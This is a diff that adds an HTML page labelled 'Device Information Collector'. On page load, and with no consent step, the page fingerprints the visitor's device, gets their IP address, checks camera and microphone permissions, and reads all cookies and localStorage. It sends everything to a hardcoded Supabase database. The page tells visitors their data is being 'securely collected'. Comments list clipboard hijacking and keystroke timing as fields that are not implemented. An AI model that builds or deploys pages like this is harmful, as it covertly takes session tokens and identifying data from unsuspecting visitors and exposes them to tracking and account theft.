@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Information Collector</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Supabase Client Library -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+    </style>
+</head>
+<body class="bg-gray-900 text-gray-100 flex items-center justify-center min-h-screen">
+    <div class="text-center p-8 bg-gray-800 rounded-2xl shadow-2xl max-w-md w-full">
+        <svg class="mx-auto h-12 w-auto text-indigo-400" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M7.864 4.243A7.5 7.5 0 0119.5 12c0 2.42-.944 4.626-2.47 6.314M12 9.75v3.75m0-10.5a7.5 7.5 0 01-7.5 7.5c-2.42 0-4.626-.944-6.314-2.47m14.263-1.031L12 12.001" />
+        </svg>
+        <h1 class="mt-4 text-2xl font-bold tracking-tight text-white sm:text-3xl">Data Collection in Progress</h1>
+        <p class="mt-4 text-gray-400">Your device information is being securely collected. Thank you for your participation.</p>
+        <div id="status" class="mt-6 p-3 bg-gray-700 rounded-lg text-indigo-300 font-mono text-sm">
+            Initializing...
+        </div>
+    </div>
+
+    <script>
+        // --- IMPORTANT: CONFIGURE YOUR SUPABASE DETAILS HERE ---
+        const SUPABASE_URL = 'https://gsmnzfbcxmhywznchoxq.supabase.co'; // Your Supabase Project URL
+        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdzbW56ZmJjeG1oeXd6bmNob3hxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY4NzI4NDgsImV4cCI6MjA3MjQ0ODg0OH0.0seF_SbMoSP5RkEZRGLcfDM07yE2T0EdyGgpgXFcs6c'; // Your Supabase Anon Public Key
+
+        // --- DO NOT EDIT BELOW THIS LINE ---
+
+        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+        const statusElement = document.getElementById('status');
+
+        function updateStatus(message) {
+            console.log(message);
+            statusElement.textContent = message;
+        }
+
+        // Helper function to create a simple hash for fingerprinting
+        const simpleHash = str => {
+            let hash = 0;
+            for (let i = 0; i < str.length; i++) {
+                const char = str.charCodeAt(i);
+                hash = (hash << 5) - hash + char;
+                hash &= hash; // Convert to 32bit integer
+            }
+            return new Uint32Array([hash])[0].toString(16);
+        };
+        
+        // Main function to collect all device information
+        async function collectAndSaveData() {
+            try {
+                updateStatus('Collection started...');
+                let data = {};
+
+                // 1. IP Address (using a third-party service)
+                updateStatus('Fetching IP Address...');
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    data.ip_address = ipData.ip;
+                } catch (e) {
+                    data.ip_address = 'Unavailable';
+                }
+
+                // 2. Device Type
+                updateStatus('Analyzing device type...');
+                data.device_type = /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+                // 3. Browser and Version
+                updateStatus('Detecting browser...');
+                data.browser_version = navigator.userAgent;
+
+                // 4. Operating System
+                updateStatus('Detecting OS...');
+                data.operating_system = navigator.platform;
+
+                // 5. Screen Resolution
+                updateStatus('Getting screen resolution...');
+                data.screen_resolution = `${window.screen.width}x${window.screen.height}`;
+
+                // 6. Time Zone
+                updateStatus('Getting time zone...');
+                data.time_zone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+                // 7. Installed Fonts (sample check)
+                updateStatus('Checking for common fonts...');
+                const commonFonts = ['Arial', 'Verdana', 'Helvetica', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS'];
+                const installedFonts = commonFonts.filter(font => document.fonts.check(`12px "${font}"`));
+                data.installed_fonts = installedFonts;
+
+                // 8. Installed Plugins
+                updateStatus('Listing browser plugins...');
+                data.installed_plugins = Array.from(navigator.plugins).map(p => ({ name: p.name, filename: p.filename }));
+                
+                // 9. Battery Status
+                updateStatus('Checking battery status...');
+                try {
+                    const battery = await navigator.getBattery();
+                    data.battery_status = {
+                        level: `${Math.round(battery.level * 100)}%`,
+                        charging: battery.charging
+                    };
+                } catch (e) {
+                    data.battery_status = 'N/A';
+                }
+
+                // 10. Language Settings
+                updateStatus('Reading language settings...');
+                data.language_settings = navigator.languages;
+                
+                // 11. Hardware Specs
+                updateStatus('Estimating hardware specs...');
+                data.hardware_specs = {
+                    cpu_cores: navigator.hardwareConcurrency,
+                    device_memory_gb: navigator.deviceMemory || 'N/A'
+                };
+
+                // 12. Browser Fingerprint (simple version)
+                updateStatus('Generating browser fingerprint...');
+                const fingerprintString = `${data.browser_version}${data.screen_resolution}${data.time_zone}${data.hardware_specs.cpu_cores}`;
+                data.browser_fingerprint = simpleHash(fingerprintString);
+                
+                // 13. Clipboard Content - NOTE: Requires user interaction for security.
+                // This will be left null unless you implement a button for the user to click.
+                data.clipboard_content = null;
+
+                // 14. Mouse Movements - NOTE: This requires event listeners. We will skip for a single snapshot.
+                data.mouse_movements = null;
+
+                // 15. Keystroke Timing - NOTE: Requires event listeners.
+                data.keystroke_timing = null;
+
+                // 16. Downloaded Files - NOTE: IMPOSSIBLE for browser JS to access file system.
+                data.downloaded_files = null;
+
+                // 17. Session Data
+                data.session_data = {
+                    page_url: window.location.href,
+                    referrer: document.referrer
+                };
+                
+                // 18. Clipboard Hijack - NOTE: Not implemented as it's a malicious action.
+                data.clipboard_hijack = false;
+
+                // 19. Webcam & Mic Access (Permissions Check)
+                updateStatus('Checking permissions...');
+                try {
+                    const webcam_permission = await navigator.permissions.query({ name: 'camera' });
+                    data.webcam_access = webcam_permission.state; // 'granted', 'prompt', or 'denied'
+                     const mic_permission = await navigator.permissions.query({ name: 'microphone' });
+                    data.microphone_access = mic_permission.state;
+                } catch (e) {
+                    data.webcam_access = 'Unsupported';
+                    data.microphone_access = 'Unsupported';
+                }
+
+                // 20. Fingerprinting Flag
+                data.fingerprinting = true;
+                
+                // 21. Browser Cookies
+                updateStatus('Reading cookies...');
+                try {
+                    data.browser_cookies = document.cookie.split(';').map(c => c.trim());
+                } catch(e) {
+                    data.browser_cookies = 'Could not read';
+                }
+                
+                // 22. Browser Local Storage
+                updateStatus('Reading local storage...');
+                try {
+                    data.browser_local_storage = { ...localStorage };
+                } catch(e) {
+                    data.browser_local_storage = 'Could not read';
+                }
+                
+                updateStatus('All data collected. Sending to database...');
+                console.log('Final data packet:', data);
+
+                const { error } = await supabase.from('device_info').insert([data]);
+
+                if (error) {
+                    throw error;
+                }
+
+                updateStatus('Success! Data has been saved.');
+
+            } catch (error) {
+                console.error('Error:', error);
+                updateStatus(`Error: ${error.message}`);
+                // In case of error, show a more user-friendly message
+                document.querySelector('h1').textContent = 'An Error Occurred';
+                document.querySelector('p').textContent = 'Could not save the device information. Please check the console for details.';
+                statusElement.classList.remove('text-indigo-300');
+                statusElement.classList.add('text-red-400');
+            }
+        }
+
+        // Run the collection script when the page loads
+        window.addEventListener('load', collectAndSaveData);
+    </script>
+</body>
+</html>
